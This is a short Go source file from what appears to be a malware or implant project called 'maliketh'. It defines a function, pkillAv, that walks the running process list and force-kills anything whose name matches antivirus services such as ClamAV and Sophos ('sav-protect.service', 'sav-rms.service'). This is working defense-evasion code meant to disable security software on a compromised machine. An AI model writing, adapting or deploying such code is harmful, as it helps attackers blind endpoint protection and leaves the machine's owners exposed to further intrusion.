package os

import (
	"maliketh/pkg/utils"
	"syscall"

	"github.com/mitchellh/go-ps"
)

func killProcByPID(pid int) error {
	err := syscall.Kill(pid, 9)
	return err
}

func pkillAv() error {
	av_processes := []string{"netsafety", "clamav", "sav-protect.service", "sav-rms.service"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if utils.ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}
